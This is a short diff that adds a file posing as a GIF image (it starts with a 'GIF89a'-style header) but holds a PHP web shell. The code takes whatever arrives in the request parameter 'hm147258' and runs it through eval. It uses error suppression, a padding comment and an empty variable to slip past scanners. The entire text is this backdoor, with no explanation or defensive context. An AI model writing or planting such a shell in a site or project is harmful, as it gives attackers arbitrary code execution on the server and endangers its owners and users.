@@ -1,0 +1,7 @@
+danGif89a
+<?php function s(){
+$a=$_REQUEST['hm147258'];
+    return $a;}
+$xx=s();
+$ganrao='';
+@eval(`/***xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx***/`.$ganrao.$xx);
